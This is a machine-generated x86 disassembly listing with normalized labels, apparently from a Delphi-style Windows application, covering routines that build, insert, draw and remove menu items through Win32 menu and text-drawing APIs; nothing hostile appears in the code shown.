test eax eax
jne r-xdata
sub_44b42c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44d9cc
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44d9dc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44b48c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44d9cc
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44d9cc
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44d9dc
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44d9dc
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44b42c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44b42c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44d9dc
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44d9dc
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44b5d8
push ebx
mov ebx eax
mov eax ebx
call sub_448180
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4504e8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44b610
push ebx
mov ebx eax
mov eax ebx
call sub_448194
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b640
push ebx
mov ebx eax
mov eax ebx
call sub_4481a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b670
push ebx
mov ebx eax
mov eax ebx
call sub_4481d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b6a0
push ebx
mov ebx eax
mov eax ebx
call sub_4481f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404368
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b6d4
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4481bc
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b710
push ebx
mov ebx eax
mov eax ebx
call sub_44820c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b744
push ebx
mov ebx eax
mov eax ebx
call sub_448220
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b778
push ebx
mov ebx eax
mov eax ebx
call sub_448234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b7ac
push ebx
mov ebx eax
mov eax ebx
call sub_419ce0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44b7d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44b7f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44d834
sub_44b814
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44d8a4
sub_44b834
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44d8f8
sub_44b854
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44b870
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403fb0
sub_44b894
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44da24
sub_44b8b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44da00
sub_44b8d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44da14
sub_44b8f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44b920
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4193f0
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44b40c
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44e330
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_44b99c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4502cc
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44d9cc
test eax eax
jg r-xdata
mov edx esi
call sub_44dd64
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44d9dc
call sub_403224
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403224
lea eax [ esi + 0x44 ]
call sub_40ccd0
lea eax [ esi + 0x78 ]
call sub_40ccd0
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44bdb8
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413dec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41943c
test bl bl
jle r-xdata
call sub_403224
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_44ba50
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bcab
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bcb2
lea eax [ ebp - 0x40 ]
call sub_403f5c
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403ff4
mov eax ebx
call sub_44d9cc
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44bf60
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404368
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44d9cc
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_44df88
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44b0b4
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042dc
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40441c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40441c
push eax
mov eax ebx
call sub_44bf60
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44d5a4
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404368
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40441c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44d9cc
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44bf60
mov [ ebp - 0x25 ] eax
sub_44bccb
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44ba50
xor eax eax
pop ebp
retn
sub_44bcf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44f5c4
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e58c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44ea88
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44b48c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44bd60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bdaa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418520
mov eax [ ebp - 0x4 ]
call sub_44b314
mov edx eax
mov eax ebx
call sub_44da00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bdb1
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_44bdb8
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44be30
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_4194c0
sub_44bdf4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419840
mov eax ebx
call sub_44d9b4
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_44d9b4
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403420
pop esi
pop ebx
retn
mov eax ebx
call sub_44be30
sub_44be30
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44bf60
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44be30
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44bf60
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44bf60
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44bcf0
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebp
call sub_44bf60
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44bf00
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44d9cc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44d9dc
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44d9dc
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44d9dc
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44b008
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44bf60
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44bcf0
mov eax [ rw-data ]
call sub_44b008
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44bfac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419768
push ebx
push sub_44bd60
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44bff0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44c1d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44df88
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403ff4
test bh 0x4
je r-xdata
mov eax edi
call sub_44f5c4
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404368
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cdac
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404224
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41c784
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41c790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c1db
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40421c
push eax
mov eax [ ebp - 0xc ]
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c4c4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40421c
push eax
mov eax [ ebp - 0xc ]
call sub_40441c
push eax
mov eax [ ebp - 0x4 ]
call sub_41d530
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c4c4
mov eax 0xff00000d
call sub_41bfbc
mov esi eax
mov eax 0xff000010
call sub_41bfbc
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c4c4
jmp r-xdata
sub_44c240
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44cb28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41cc90
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c4c4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404368
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41cc90
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d034
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449004
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d530
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
